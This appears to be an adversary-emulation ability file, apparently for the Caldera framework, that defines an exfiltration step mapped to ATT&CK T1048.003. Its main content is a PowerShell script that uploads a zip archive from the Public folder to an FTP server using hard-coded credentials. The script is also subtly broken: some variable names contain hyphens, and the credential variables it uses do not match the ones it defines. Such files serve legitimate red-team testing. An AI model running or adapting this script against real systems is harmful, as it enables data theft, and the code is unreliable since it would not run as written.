- tactic: exfiltration
  requirements: []
  technique_id: T1048.003
  plugin: ''
  buckets:
  - exfiltration
  privilege: ''
  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
  singleton: false
  executors:
  - platform: windows
    payloads: []
    command: '$SourceFile = "data.zip";

      $SourceDirectory = "$env:PUBLIC\";

      $FullPathFile=$SourceDirectory+$SourceFile;

      $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$SourceFile";

      $ftp-server-url="ftp://192.168.0.102";

      $ftp-server-port="2222";

      $ftp-user="caldera_user";

      $ftp-password="caldera";

      $colomn=":";

      $slash="/";


      $ftp = [System.Net.FtpWebRequest]::Create("$ftp-server-url$colomn$ftp-server-port$slash$RemoteName");

      $ftp = [System.Net.FTPWebRequest]$ftp;

      $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;

      $ftp.Credentials = New-Object System.Net.NetworkCredential("$ftp_user", "$ftp_password");

      $ftp.UseBinary = $true;

      $ftp.UsePassive = $true;


      $content = gc -encoding Byte $FullPathFile;

      $ftp.ContentLength = $content.Length;

      $requestStream = $ftp.GetRequestStream();

      $requestStream.Write($content, 0, $content.Length);


      $requestStream.Close();

      $requestStream.Dispose();'
    parsers: []
    variations: []
    build_target: null
    uploads: []
    code: null
    timeout: 60
    cleanup: []
    additional_info: {}
    name: psh
    language: null
  additional_info: {}
  access: {}
  name: Exfiltration of a Compressed Archive to FTP Server
  description: Exfiltrates a compressed archive to a FTP server.
  delete_payload: true
  repeatable: false
  id: ftp_archive_exfiltration
